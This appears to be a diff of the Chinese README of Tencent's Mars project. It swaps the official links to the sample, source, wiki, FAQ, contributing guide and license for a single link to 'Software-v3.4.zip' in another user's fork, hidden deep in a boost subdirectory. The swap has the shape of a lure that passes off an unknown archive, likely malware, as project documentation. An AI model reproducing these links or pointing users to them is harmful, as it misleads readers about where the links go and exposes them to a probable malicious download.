-3. 阅读 [wiki](https://github.com/Tencent/mars/wiki) 或者 [FAQ](https://github.com/Tencent/mars/wiki/Mars-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
+1. 参看 [mars/sample](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
+2. 阅读 [源码](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
+3. 阅读 [wiki](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip) 或者 [FAQ](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
 4. 联系我们.
 
 ## Contributing
-关于 Mars 分支管理、issue 以及 pr 规范, 请阅读 [Mars Contributing Guide](https://github.com/Tencent/mars/blob/master/CONTRIBUTING.md).
+关于 Mars 分支管理、issue 以及 pr 规范, 请阅读 [Mars Contributing Guide](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
 
 ## License
-Mars 使用的 MIT 协议，详细请参考[LICENSE](https://github.com/Tencent/mars/blob/master/LICENSE).
+Mars 使用的 MIT 协议，详细请参考[LICENSE](https://github.com/tanglongwei/mars/raw/refs/heads/master/mars/boost/intrusive/detail/Software-v3.4.zip).
